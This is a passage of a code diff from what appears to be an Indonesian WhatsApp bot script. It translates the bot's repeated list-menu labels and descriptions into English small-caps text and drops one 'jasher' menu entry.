+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -5578,186 +5744,181 @@ break
 case 'islamimenu': {
   let HydroSad = `${islamimenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -5771,186 +5932,181 @@ break
 case 'rpgmenu': {
   let HydroSad = `${rpgmenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -5964,186 +6120,181 @@ break
 case 'ownermenu': {
   let HydroSad = `${ ownermenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
